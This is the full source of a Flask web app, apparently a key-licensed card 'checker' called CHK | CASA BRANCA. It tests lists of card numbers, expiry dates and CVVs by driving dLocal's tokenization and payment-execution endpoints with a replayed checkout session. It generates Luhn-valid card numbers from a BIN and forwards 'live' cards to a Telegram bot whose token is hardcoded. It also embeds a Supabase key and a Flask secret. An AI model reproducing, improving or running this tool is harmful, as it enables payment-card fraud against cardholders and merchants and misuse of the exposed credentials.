from flask import Flask, render_template_string, request, jsonify, session, redirect
import requests
import threading
import queue
import re
import random
import string
import time
import os
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = "SUPPYS7_SECRET_KEY_2024"

# Configurações
SUPABASE_URL = 'https://lhsnuricdmdoiwsilvxm.supabase.co'
SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imxoc251cmljZG1kb2l3c2lsdnhtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUzMzkyMjIsImV4cCI6MjA5MDkxNTIyMn0.DZX6YTYz9lz4yT5P9cyDCcXPwe-id7QFbGp4HKnhfmM'

# Estado global do checker
is_running = False
task_queue = queue.Queue()
total_count = 0
testadas_count = 0
live_count = 0
die_count = 0
live_results = []
die_results = []
current_api = "dlocal"
threads_count = 2
user_tg_id = "8309449775"

# ============ FUNÇÃO DA API dLocal ============
def testar_cartao_dlocal(pan, mes, ano, cvv):
    """Testa um cartão usando a API dLocal"""
    
    headers_cvault = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://static.dlocal.com',
        'referer': 'https://static.dlocal.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'x-fields-api-key': 'd9d9f2e6-71dd-47a9-9ee1-6aabc0953f2c',
        'x-uow': '1-69d11458-5f4fca0830611f0c74fad50f',
    }
    
    json_cvault = {
        'expiration_month': mes,
        'expiration_year': ano,
        'holder_name': 'LUCAS SILVA',
        'pan': pan,
        'key': 'd9d9f2e6-71dd-47a9-9ee1-6aabc0953f2c',
        'country_code': 'BR',
        'cvv': cvv,
    }
    
    try:
        # ETAPA 1: Gerar token
        response_cvault = requests.post(
            'https://ppmcc.dlocal.com/cvault/credit-card/temporal',
            headers=headers_cvault,
            json=json_cvault,
            timeout=20
        )
        
        if response_cvault.status_code != 200:
            return {"success": False, "message": "FALHA NA VALIDAÇÃO"}
        
        dados_cvault = response_cvault.json()
        
        if 'token' not in dados_cvault:
            erro_msg = dados_cvault.get('message', 'Token não gerado')
            return {"success": False, "message": f"ERRO: {erro_msg}"}
        
        token = dados_cvault['token']
        
        # ETAPA 2: Consultar parcelas
        cookies_installment = {
            'checkoutAttributes': '%7B%22attributes%22%3A%5B%5D%2C%22attributesValues%22%3A%7B%7D%7D',
            '_hjSession_3812445': 'eyJpZCI6IjZiZjI3NTUzLTY0NjMtNDc0Mi05MTMxLTJlZjY5YWI4YWE2MCIsImMiOjE3NzUzMDk3MjE5MTksInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=',
            '_ga': 'GA1.1.800554140.1775309723',
        }
        
        headers_installment = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://pay.dlocal.com',
            'referer': 'https://pay.dlocal.com/checkout/R-125-x1kt24sb-ffh7pu1q8p0nn5-n4iq39cur4s0',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        }
        
        json_installment = {
            'paymentId': 'R-125-x1kt24sb-ffh7pu1q8p0nn5-n4iq39cur4s0',
            'paymentMethodId': 'CARD',
            'ccToken': token,
            'bin': pan[:6],
        }
        
        response_installment = requests.post(
            'https://pay.dlocal.com/checkout/api/installments',
            cookies=cookies_installment,
            headers=headers_installment,
            json=json_installment,
            timeout=20
        )
        
        installment_id = 'GMI-a54af5fa-9ac9-417c-844e-6c3963837965'
        if response_installment.status_code == 200:
            dados_installment = response_installment.json()
            if 'installments' in dados_installment and len(dados_installment['installments']) > 0:
                installment_id = dados_installment['installments'][0].get('id', installment_id)
        
        # ETAPA 3: Executar pagamento
        cookies_pay = {
            'checkoutAttributes': '%7B%22attributes%22%3A%5B%5D%2C%22attributesValues%22%3A%7B%7D%7D',
            '_hjSession_3812445': 'eyJpZCI6IjZiZjI3NTUzLTY0NjMtNDc0Mi05MTMxLTJlZjY5YWI4YWE2MCIsImMiOjE3NzUzMDk3MjE5MTksInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=',
            '_ga': 'GA1.1.800554140.1775309723',
            '_hjSessionUser_3812445': 'eyJpZCI6IjNlYzExNmNkLTAzZDEtNWNhZi1hZDA1LWMxOTRlYzhmOWEyNSIsImNyZWF0ZWQiOjE3NzUzMDk3MjE5MTcsImV4aXN0aW5nIjp0cnVlfQ==',
            '_ga_EME5Z8NFBR': 'GS2.1.s1775309722$o1$g1$t1775309927$j21$l0$h0',
        }
        
        headers_pay = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://pay.dlocal.com',
            'referer': 'https://pay.dlocal.com/checkout/R-125-x1kt24sb-ffh7pu1q8p0nn5-n4iq39cur4s0',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        }
        
        json_pay = {
            'paymentId': 'R-125-x1kt24sb-ffh7pu1q8p0nn5-n4iq39cur4s0',
            'paymentMethodId': 'CARD',
            'paymentMethodType': 'CARD',
            'ccToken': token,
            'installmentId': installment_id,
            'installmentsPlan': 1,
            'userData': {},
            'isMultipleCard': False,
            'selectedCardType': None,
        }
        
        response_pay = requests.post(
            'https://pay.dlocal.com/checkout/api/execute',
            cookies=cookies_pay,
            headers=headers_pay,
            json=json_pay,
            timeout=20
        )
        
        if response_pay.status_code == 200:
            dados_pay = response_pay.json()
            status = dados_pay.get('status', 'UNKNOWN')
            
            if status == 'SUCCESS' or status == 'APPROVED':
                return {"success": True, "message": "APROVADO", "status": status}
            else:
                return {"success": False, "message": "REPROVADO", "status": status}
        else:
            return {"success": False, "message": f"HTTP {response_pay.status_code}"}
            
    except requests.exceptions.Timeout:
        return {"success": False, "message": "TIMEOUT"}
    except Exception as e:
        return {"success": False, "message": f"ERRO: {str(e)[:50]}"}

# ============ FUNÇÃO DO CHECKER ============
def check_card(cc_data):
    parts = cc_data.split('|')
    if len(parts) != 4:
        return f"❌ DIE | {cc_data} | FORMATO INVÁLIDO"
    
    pan = parts[0].strip()
    mes = parts[1].strip()
    ano = parts[2].strip()
    cvv = parts[3].strip()
    
    # Validar cartão
    if not pan or not mes or not ano or not cvv:
        return f"❌ DIE | {cc_data} | DADOS INCOMPLETOS"
    
    if len(pan) < 15:
        return f"❌ DIE | {cc_data} | CARTÃO INVÁLIDO"
    
    # Chamar API dLocal
    resultado = testar_cartao_dlocal(pan, mes, ano, cvv)
    
    if resultado["success"]:
        return f"✅ LIVE | {cc_data} | {resultado['message']} | dLocal"
    else:
        return f"❌ DIE | {cc_data} | {resultado['message']} | dLocal"

# ============ SUPABASE FUNCTIONS ============
def supabase_request(method, endpoint, data=None):
    url = f"{SUPABASE_URL}/rest/v1/{endpoint}"
    headers = {
        'apikey': SUPABASE_KEY,
        'Authorization': f'Bearer {SUPABASE_KEY}',
        'Content-Type': 'application/json'
    }
    
    try:
        if method == 'GET':
            response = requests.get(url, headers=headers)
        elif method == 'POST':
            response = requests.post(url, headers=headers, json=data)
        elif method == 'PATCH':
            response = requests.patch(url, headers=headers, json=data)
        elif method == 'DELETE':
            response = requests.delete(url, headers=headers)
        else:
            return None
        
        if response.status_code in [200, 201]:
            return response.json()
        return None
    except:
        return None

# ============ PÁGINAS HTML ============
LOCK_PAGE = '''<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CHK | CASA BRANCA</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #000000 0%, #1a0000 100%);
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow: hidden;
        }
        body::before {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at center, rgba(255,0,0,0.1) 0%, transparent 70%);
            animation: pulse 4s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 0.6; }
        }
        .container { width: 100%; max-width: 450px; padding: 20px; position: relative; z-index: 1; }
        .lock-card {
            background: rgba(5, 5, 5, 0.95);
            border: 2px solid #ff0000;
            border-radius: 30px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
            backdrop-filter: blur(10px);
            animation: borderGlow 2s ease-in-out infinite alternate;
        }
        @keyframes borderGlow {
            from { box-shadow: 0 0 20px rgba(255, 0, 0, 0.3); border-color: #ff0000; }
            to { box-shadow: 0 0 50px rgba(255, 0, 0, 0.6); border-color: #ff4444; }
        }
        .logo-img {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            margin-bottom: 20px;
            border: 3px solid #ff0000;
            object-fit: cover;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
            transition: transform 0.3s;
        }
        .title {
            color: #ff0000;
            font-size: 1.8rem;
            font-weight: bold;
            letter-spacing: 3px;
            margin-bottom: 8px;
            text-shadow: 0 0 15px #ff0000;
        }
        .subtitle {
            color: #ff6666;
            font-size: 0.7rem;
            margin-bottom: 35px;
            border-bottom: 1px solid rgba(255,0,0,0.3);
            padding-bottom: 15px;
        }
        .key-input {
            width: 100%;
            padding: 15px;
            background: rgba(0,0,0,0.8);
            border: 2px solid #333;
            color: #ff0000;
            font-size: 1.2rem;
            text-align: center;
            letter-spacing: 3px;
            font-family: monospace;
            border-radius: 50px;
            transition: all 0.3s;
        }
        .key-input:focus {
            border-color: #ff0000;
            outline: none;
            box-shadow: 0 0 25px rgba(255, 0, 0, 0.4);
        }
        .activate-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #ff0000, #cc0000);
            color: #000;
            border: none;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            border-radius: 50px;
            margin-top: 25px;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .activate-btn:hover {
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.6);
        }
        .message {
            margin-top: 20px;
            padding: 12px;
            border-radius: 25px;
            display: none;
            font-size: 0.8rem;
        }
        .message.error {
            background: rgba(255, 0, 0, 0.15);
            border: 1px solid #ff0000;
            color: #ff6666;
            display: block;
        }
        .message.success {
            background: rgba(255, 0, 0, 0.15);
            border: 1px solid #ff0000;
            color: #ff0000;
            display: block;
        }
        .footer {
            margin-top: 30px;
            color: #444;
            font-size: 0.6rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="lock-card">
            <img src="/static/fundo.jpg" class="logo-img" alt="CASA BRANCA" onerror="this.style.display='none'">
            <div class="title">CHK | CASA BRANCA</div>
            <div class="subtitle">✦ SISTEMA DE ATIVAÇÃO ✦</div>
            
            <input type="text" class="key-input" id="activationKey" placeholder="XXXX-XXXX" maxlength="9" oninput="formatKey(this)">
            
            <button class="activate-btn" onclick="activateKey()">⚡ ATIVAR ACESSO ⚡</button>
            
            <div id="message" class="message"></div>
            
            <div class="footer">🔥 criador: @suppys7 🔥</div>
        </div>
    </div>
    
    <script>
        function formatKey(input) {
            let value = input.value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
            if (value.length > 4) {
                value = value.substring(0,4) + '-' + value.substring(4,8);
            }
            input.value = value;
        }
        
        async function activateKey() {
            const key = document.getElementById('activationKey').value;
            const messageDiv = document.getElementById('message');
            
            if (!key || key.length < 9) {
                messageDiv.className = 'message error';
                messageDiv.innerHTML = '❌ KEY INVÁLIDA! Formato: XXXX-XXXX';
                return;
            }
            
            messageDiv.className = 'message';
            messageDiv.innerHTML = '🔄 VERIFICANDO KEY...';
            messageDiv.style.display = 'block';
            
            try {
                const response = await fetch('/activate', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({key: key})
                });
                
                const data = await response.json();
                
                if (data.success) {
                    messageDiv.className = 'message success';
                    messageDiv.innerHTML = '✅ ' + data.message;
                    setTimeout(() => {
                        window.location.href = '/dashboard';
                    }, 1500);
                } else {
                    messageDiv.className = 'message error';
                    messageDiv.innerHTML = '❌ ' + data.message;
                }
            } catch (error) {
                messageDiv.className = 'message error';
                messageDiv.innerHTML = '❌ ERRO DE CONEXÃO! Tente novamente.';
            }
        }
    </script>
</body>
</html>
'''

DASHBOARD_PAGE = '''<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CHK | CASA BRANCA</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', monospace; }
        body { background: linear-gradient(135deg, #0a0a0a 0%, #1a0000 100%); color: #ff0000; padding: 20px; min-height: 100vh; }
        .container { max-width: 800px; margin: 0 auto; }
        .header { text-align: center; padding: 25px; border-bottom: 2px solid #ff0000; margin-bottom: 20px; border-radius: 30px 30px 0 0; background: rgba(0,0,0,0.3); }
        .header h1 { font-size: 1.5rem; letter-spacing: 4px; color: #ff0000; text-shadow: 0 0 15px #ff0000; animation: neonPulse 1.5s ease-in-out infinite alternate; }
        @keyframes neonPulse { from { text-shadow: 0 0 5px #ff0000; } to { text-shadow: 0 0 20px #ff0000; } }
        .user-info { text-align: right; margin-bottom: 20px; padding: 12px 18px; background: rgba(17,17,17,0.9); border-radius: 50px; font-size: 0.7rem; border: 1px solid #ff0000; }
        .nav { display: flex; gap: 12px; margin-bottom: 20px; }
        .nav-btn { flex: 1; padding: 14px; background: rgba(26,26,26,0.9); border: 1px solid #333; color: #fff; cursor: pointer; font-weight: bold; border-radius: 50px; transition: all 0.3s; }
        .nav-btn.active { background: #ff0000; color: #000; border-color: #ff0000; box-shadow: 0 0 20px rgba(255,0,0,0.3); }
        .page { display: none; }
        .page.active { display: block; animation: fadeIn 0.5s; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .card { background: rgba(17,17,17,0.9); border: 1px solid #333; padding: 25px; margin-bottom: 20px; border-radius: 25px; transition: all 0.3s; }
        .card:hover { border-color: #ff0000; box-shadow: 0 0 15px rgba(255,0,0,0.1); }
        label { font-size: 0.7rem; color: #ff6666; display: block; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1px; }
        input, select, textarea { width: 100%; padding: 14px; background: #000; border: 1px solid #333; color: #ff0000; margin-bottom: 15px; border-radius: 15px; transition: all 0.3s; }
        input:focus, select:focus, textarea:focus { border-color: #ff0000; outline: none; box-shadow: 0 0 10px rgba(255,0,0,0.2); }
        .btn-group { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
        .btn { padding: 15px; border: none; font-weight: bold; cursor: pointer; font-size: 0.9rem; border-radius: 50px; transition: all 0.3s; }
        .btn-start { background: linear-gradient(135deg, #ff0000, #cc0000); color: #000; box-shadow: 0 0 15px rgba(255,0,0,0.3); }
        .btn-start:hover { transform: scale(1.02); box-shadow: 0 0 25px rgba(255,0,0,0.5); }
        .btn-stop { background: #660000; color: #fff; }
        .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; padding: 20px; background: rgba(17,17,17,0.9); border: 1px solid #333; margin-bottom: 20px; border-radius: 25px; text-align: center; }
        .stat-label { font-size: 0.6rem; color: #ff6666; display: block; margin-bottom: 5px; }
        .stat-val { font-size: 1.3rem; font-weight: bold; display: block; margin-top: 5px; color: #ff0000; text-shadow: 0 0 5px rgba(255,0,0,0.3); }
        .box { background: #000; border: 1px solid #333; height: 200px; overflow-y: auto; padding: 12px; font-size: 0.7rem; border-radius: 20px; }
        .item-live { border-left: 3px solid #ff0000; color: #ff0000; padding: 8px; margin-bottom: 6px; border-radius: 10px; background: rgba(255,0,0,0.05); }
        .item-die { border-left: 3px solid #660000; color: #ff6666; padding: 8px; margin-bottom: 6px; border-radius: 10px; background: rgba(102,0,0,0.05); }
        .action-btn { background: rgba(26,26,26,0.9); border: 1px solid #ff0000; color: #ff0000; padding: 6px 14px; cursor: pointer; font-size: 0.7rem; border-radius: 20px; transition: all 0.3s; }
        .action-btn:hover { background: #ff0000; color: #000; box-shadow: 0 0 10px rgba(255,0,0,0.3); }
        .logout-btn { background: #660000; color: #fff; border: none; padding: 6px 14px; cursor: pointer; margin-left: 12px; border-radius: 20px; }
        footer { text-align: center; padding: 20px; color: #444; font-size: 0.7rem; }
        textarea { font-family: monospace; resize: vertical; }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #1a1a1a; border-radius: 10px; }
        ::-webkit-scrollbar-thumb { background: #ff0000; border-radius: 10px; }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>⚡ CHK | CASA BRANCA ⚡</h1>
        <p style="color: #ff6666; margin-top: 5px;">DLOCAL GATEWAY SYSTEM</p>
    </div>
    
    <div class="user-info">
        <span>✅ ATIVADO: {{ key_info.key }}</span>
        <span style="margin-left: 15px;">⏰ EXPIRA: {{ key_info.expires_at }}</span>
        <button class="logout-btn" onclick="logout()">🚪 SAIR</button>
    </div>
    
    <div class="nav">
        <button class="nav-btn active" onclick="showPage('checker', this)">🔍 CHECKER</button>
        <button class="nav-btn" onclick="showPage('gerador', this)">🎲 GERADOR</button>
    </div>
    
    <div id="page-checker" class="page active">
        <div class="card">
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                <div>
                    <label>🎮 GATEWAY</label>
                    <select id="api_selector">
                        <option value="dlocal">DLOCAL GATE 1</option>
                    </select>
                </div>
                <div>
                    <label>⚡ THREADS</label>
                    <select id="thread_selector">
                        <option value="1">1 THREAD</option>
                        <option value="2">2 THREADS</option>
                        <option value="3">3 THREADS</option>
                    </select>
                </div>
            </div>
            <label>📱 TELEGRAM ID (LIVES)</label>
            <input type="text" id="user_tg_id" placeholder="Ex: 12345678" value="8309449775">
        </div>
        
        <div class="btn-group">
            <button class="btn btn-start" onclick="start()" id="btnStart">▶ INICIAR</button>
            <button class="btn btn-stop" onclick="stop()" id="btnStop" disabled>⏹ PARAR</button>
        </div>
        
        <div class="stats">
            <div class="stat-item"><span class="stat-label">📊 CARREGADAS</span><span class="stat-val" id="totalCount">0</span></div>
            <div class="stat-item"><span class="stat-label">🔄 TESTADAS</span><span class="stat-val" id="testadasCount">0</span></div>
            <div class="stat-item"><span class="stat-label">✅ APROVADAS</span><span class="stat-val" id="liveCountStat">0</span></div>
            <div class="stat-item"><span class="stat-label">❌ REPROVADAS</span><span class="stat-val" id="dieCountStat">0</span></div>
        </div>
        
        <textarea id="lista_input" rows="6" placeholder="CC|MES|ANO|CVV&#10;Ex: 4220619672450486|12|2032|439" oninput="updateTotal()"></textarea>
        
        <div class="card">
            <div style="display: flex; justify-content: space-between; margin-bottom: 12px;">
                <label>✅ APROVADAS</label>
                <button class="action-btn" onclick="copyList('live_list')">📋 COPIAR</button>
            </div>
            <div id="live_list" class="box"></div>
        </div>
        
        <div class="card">
            <div style="display: flex; justify-content: space-between; margin-bottom: 12px;">
                <label>❌ REPROVADAS</label>
                <button class="action-btn" onclick="clearDie()">🗑 LIMPAR</button>
            </div>
            <div id="die_list" class="box"></div>
        </div>
    </div>
    
    <div id="page-gerador" class="page">
        <div class="card">
            <label>🔢 BIN/MATRIX</label>
            <input type="text" id="gen_bin" placeholder="Ex: 422061" maxlength="16">
            <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px;">
                <div>
                    <label>📅 MÊS</label>
                    <select id="gen_mes">
                        <option value="rnd">🎲 RANDOM</option>
                        <option value="01">01</option><option value="02">02</option>
                        <option value="03">03</option><option value="04">04</option>
                        <option value="05">05</option><option value="06">06</option>
                        <option value="07">07</option><option value="08">08</option>
                        <option value="09">09</option><option value="10">10</option>
                        <option value="11">11</option><option value="12">12</option>
                    </select>
                </div>
                <div>
                    <label>📅 ANO</label>
                    <select id="gen_ano">
                        <option value="rnd">🎲 RANDOM</option>
                        <option value="2026">2026</option><option value="2027">2027</option>
                        <option value="2028">2028</option><option value="2029">2029</option>
                        <option value="2030">2030</option><option value="2031">2031</option>
                        <option value="2032">2032</option><option value="2033">2033</option>
                        <option value="2034">2034</option>
                    </select>
                </div>
                <div>
                    <label>🔐 CVV</label>
                    <input type="text" id="gen_cvv" value="rnd">
                </div>
            </div>
            <label>🔢 QUANTIDADE</label>
            <input type="number" id="gen_quant" value="10" min="1">
            <button class="btn btn-start" style="width:100%; margin-top:15px" onclick="generate()">✨ GERAR CARDS ✨</button>
        </div>
        <div class="card">
            <textarea id="gen_out" rows="8" readonly placeholder="Cards gerados..."></textarea>
            <button class="action-btn" style="width:100%; margin-top:12px" onclick="copyGen()">📋 COPIAR TUDO</button>
        </div>
    </div>
    
    <footer>🔥 criador: @suppys7 | CASA BRANCA | dLocal System 🔥</footer>
</div>

<script>
    let isRunning = false;
    let currentQueue = [];
    let totalCards = 0;
    let testedCards = 0;
    let liveCards = 0;
    let dieCards = 0;
    let updateInterval = null;
    
    function showPage(page, btn) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
        document.getElementById('page-' + page).classList.add('active');
        btn.classList.add('active');
    }
    
    function updateTotal() {
        const text = document.getElementById('lista_input').value;
        const lines = text.split('\\n').filter(l => l.trim().length > 5);
        document.getElementById('totalCount').innerText = lines.length;
        totalCards = lines.length;
    }
    
    async function start() {
        const lista = document.getElementById('lista_input').value;
        if (!lista.trim()) {
            alert('⚠️ Lista vazia!');
            return;
        }
        
        const lines = lista.split('\\n').filter(l => l.trim().length > 5);
        totalCards = lines.length;
        testedCards = 0;
        liveCards = 0;
        dieCards = 0;
        currentQueue = [...lines];
        
        document.getElementById('live_list').innerHTML = '';
        document.getElementById('die_list').innerHTML = '';
        document.getElementById('totalCount').innerText = totalCards;
        document.getElementById('testadasCount').innerText = '0';
        document.getElementById('liveCountStat').innerText = '0';
        document.getElementById('dieCountStat').innerText = '0';
        
        isRunning = true;
        document.getElementById('btnStart').disabled = true;
        document.getElementById('btnStop').disabled = false;
        
        const api = document.getElementById('api_selector').value;
        const threads = parseInt(document.getElementById('thread_selector').value);
        
        for (let i = 0; i < threads; i++) {
            runThread(api);
        }
        
        if (updateInterval) clearInterval(updateInterval);
        updateInterval = setInterval(updateStats, 1000);
    }
    
    async function runThread(api) {
        while (isRunning && currentQueue.length > 0) {
            const item = currentQueue.shift();
            if (item) {
                await processItem(item, api);
                // Delay entre requisições para evitar bloqueio
                await new Promise(r => setTimeout(r, 2000));
            }
        }
    }
    
    async function processItem(line, api) {
        try {
            const response = await fetch(`/check?api=${api}&lista=${encodeURIComponent(line)}`);
            const result = await response.text();
            
            const isLive = result.includes('✅') || result.includes('LIVE') || result.includes('APROVADO');
            
            if (isLive) {
                liveCards++;
                addResult(result, true);
                const telegramId = document.getElementById('user_tg_id').value;
                if (telegramId && telegramId.length > 5) {
                    fetch(`https://api.telegram.org/bot8551255392:AAEwXi_cXDIWESAQ8GGwC1Q3m7-yEmyDMZ4/sendMessage?chat_id=${telegramId}&text=${encodeURIComponent(result.substring(0, 500))}`);
                }
            } else {
                dieCards++;
                addResult(result, false);
            }
            
            testedCards++;
            updateStatsDisplay();
            
            if (testedCards >= totalCards) {
                stop();
            }
        } catch(e) {
            console.error(e);
            addResult('❌ ERRO: ' + e.message, false);
            testedCards++;
            updateStatsDisplay();
        }
    }
    
    function addResult(msg, isLive) {
        const div = document.createElement('div');
        div.className = isLive ? 'item-live' : 'item-die';
        div.innerHTML = (isLive ? '✅ ' : '❌ ') + msg.replace(/<br>/g, ' ').substring(0, 200);
        const box = document.getElementById(isLive ? 'live_list' : 'die_list');
        box.insertBefore(div, box.firstChild);
    }
    
    function updateStatsDisplay() {
        document.getElementById('testadasCount').innerText = testedCards;
        document.getElementById('liveCountStat').innerText = liveCards;
        document.getElementById('dieCountStat').innerText = dieCards;
    }
    
    async function updateStats() {
        const response = await fetch('/stats');
        const data = await response.json();
        document.getElementById('testadasCount').innerText = data.tested;
        document.getElementById('liveCountStat').innerText = data.live;
        document.getElementById('dieCountStat').innerText = data.die;
    }
    
    function stop() {
        isRunning = false;
        document.getElementById('btnStart').disabled = false;
        document.getElementById('btnStop').disabled = true;
        if (updateInterval) clearInterval(updateInterval);
    }
    
    function clearDie() {
        document.getElementById('die_list').innerHTML = '';
        dieCards = 0;
        document.getElementById('dieCountStat').innerText = '0';
        fetch('/clear_die', {method: 'POST'});
    }
    
    function copyList(id) {
        const el = document.getElementById(id);
        const text = Array.from(el.children).map(c => c.innerText.replace(/^✅|❌/g, '').trim()).join('\\n');
        navigator.clipboard.writeText(text).then(() => alert('📋 Copiado!'));
    }
    
    function copyGen() {
        const text = document.getElementById('gen_out').value;
        navigator.clipboard.writeText(text).then(() => alert('📋 Copiado!'));
    }
    
    function logout() {
        window.location.href = '/logout';
    }
    
    function getLuhn(str) {
        let sum = 0, double = true;
        for (let i = str.length - 1; i >= 0; i--) {
            let digit = parseInt(str.charAt(i));
            if (double) { digit *= 2; if (digit > 9) digit -= 9; }
            sum += digit;
            double = !double;
        }
        return (sum * 9) % 10;
    }
    
    function generate() {
        let binRaw = document.getElementById('gen_bin').value.replace(/[^\\d]/g, '');
        if (binRaw.length < 6) {
            alert('⚠️ BIN inválida! Mínimo 6 dígitos');
            return;
        }
        
        let isAmex = binRaw.startsWith('34') || binRaw.startsWith('37');
        let ccLen = isAmex ? 15 : 16;
        let cvvLen = isAmex ? 4 : 3;
        let res = '';
        let quant = parseInt(document.getElementById('gen_quant').value);
        
        for (let i = 0; i < quant; i++) {
            let cc = binRaw;
            while (cc.length < ccLen - 1) cc += Math.floor(Math.random() * 10);
            cc += getLuhn(cc);
            
            let m = document.getElementById('gen_mes').value;
            let mm = m === 'rnd' ? ('0' + (Math.floor(Math.random() * 12) + 1)).slice(-2) : m;
            
            let a = document.getElementById('gen_ano').value;
            let aa = a === 'rnd' ? Math.floor(Math.random() * (2034 - 2026) + 2026) : a;
            
            let cv = document.getElementById('gen_cvv').value;
            let cvv = cv === 'rnd' ? Array.from({length: cvvLen}, () => Math.floor(Math.random() * 10)).join('') : cv.substring(0, cvvLen);
            
            res += `${cc}|${mm}|${aa}|${cvv}\\n`;
        }
        document.getElementById('gen_out').value = res;
    }
    
    updateTotal();
</script>
</body>
</html>
'''

# ============ ROTAS FLASK ============

@app.route('/')
def index():
    if 'activated_key' in session:
        key = session['activated_key']
        result = supabase_request('GET', f"keys?key=eq.{key}&select=expires_at")
        if result and len(result) > 0 and datetime.strptime(result[0]['expires_at'], '%Y-%m-%d %H:%M:%S') > datetime.now():
            key_info = {'key': key, 'expires_at': datetime.strptime(result[0]['expires_at'], '%Y-%m-%d %H:%M:%S').strftime('%d/%m/%Y %H:%M')}
            return render_template_string(DASHBOARD_PAGE, key_info=key_info)
        else:
            session.pop('activated_key', None)
    return LOCK_PAGE

@app.route('/dashboard')
def dashboard():
    return index()

@app.route('/activate', methods=['POST'])
def activate():
    data = request.json
    key = data.get('key', '').upper()
    
    result = supabase_request('GET', f"keys?key=eq.{key}&select=*")
    
    if not result or len(result) == 0:
        return jsonify({'success': False, 'message': 'KEY INVÁLIDA!'})
    
    row = result[0]
    
    if row['status'] != 'active':
        return jsonify({'success': False, 'message': 'KEY JÁ UTILIZADA!'})
    
    if datetime.strptime(row['expires_at'], '%Y-%m-%d %H:%M:%S') < datetime.now():
        return jsonify({'success': False, 'message': 'KEY EXPIRADA!'})
    
    supabase_request('PATCH', f"keys?key=eq.{key}", {
        'status': 'used',
        'used_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    })
    
    session['activated_key'] = key
    
    return jsonify({'success': True, 'message': 'KEY ATIVADA COM SUCESSO!'})

@app.route('/logout')
def logout():
    session.pop('activated_key', None)
    return redirect('/')

@app.route('/check')
def check():
    global testadas_count, live_count, die_count, live_results, die_results
    
    lista = request.args.get('lista', '')
    api = request.args.get('api', 'dlocal')
    
    if not lista:
        return "❌ Lista vazia"
    
    resultado = check_card(lista)
    
    is_live = '✅' in resultado
    
    if is_live:
        live_count += 1
        live_results.insert(0, resultado)
    else:
        die_count += 1
        die_results.insert(0, resultado)
    
    testadas_count += 1
    
    return resultado

@app.route('/stats')
def stats():
    global total_count, testadas_count, live_count, die_count, live_results, die_results
    return jsonify({
        'total': total_count,
        'tested': testadas_count,
        'live': live_count,
        'die': die_count,
        'live_results': live_results[-50:],
        'die_results': die_results[-50:]
    })

@app.route('/clear_die', methods=['POST'])
def clear_die():
    global die_results, die_count
    die_results = []
    die_count = 0
    return jsonify({'success': True})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("=" * 50)
    print("🔥 CHK | CASA BRANCA - DLOCAL GATEWAY")
    print(f"👤 Criador: @suppys7")
    print(f"🔗 Acesse: http://localhost:{port}")
    print("=" * 50)
    app.run(host='0.0.0.0', port=port, debug=False)